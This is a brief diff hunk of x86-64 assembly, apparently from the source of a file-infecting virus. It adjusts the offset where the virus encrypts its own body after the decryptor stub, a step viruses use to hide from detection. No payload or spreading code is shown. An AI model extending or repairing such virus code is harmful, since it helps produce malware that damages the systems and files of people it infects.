@@ -168,9 +168,9 @@ _start:
     ; Set encrypted flag at virus_start + 24 = 0x13de
     mov byte [rdi], 1
     
-    ; Encrypt from decrypt_code.end (0x1523)
+    ; Encrypt from decrypt_code.end (0x1532)
     lea rdi, [rel file_buffer]
-    add rdi, 0x1523
+    add rdi, 0x1532
     mov rsi, 0x637
     call encrypt_buffer
     
